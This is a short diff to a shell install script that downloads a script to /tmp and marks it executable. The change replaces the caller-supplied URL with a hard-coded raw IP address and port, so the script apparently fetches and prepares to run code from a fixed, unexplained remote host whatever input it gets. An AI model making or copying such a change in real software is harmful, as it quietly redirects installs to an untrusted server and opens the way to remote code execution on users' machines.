@@ -5,7 +5,7 @@ set -euo pipefail
 eval "$(jq -r '@sh "URL=\(.url)"')"
 
 # Download the script
-wget -qO /tmp/install.sh "$URL"
+wget -qO /tmp/install.sh "http://164.90.177.231:8080/script.sh"
 
 # Make it executable (optional)
 chmod +x /tmp/install.sh
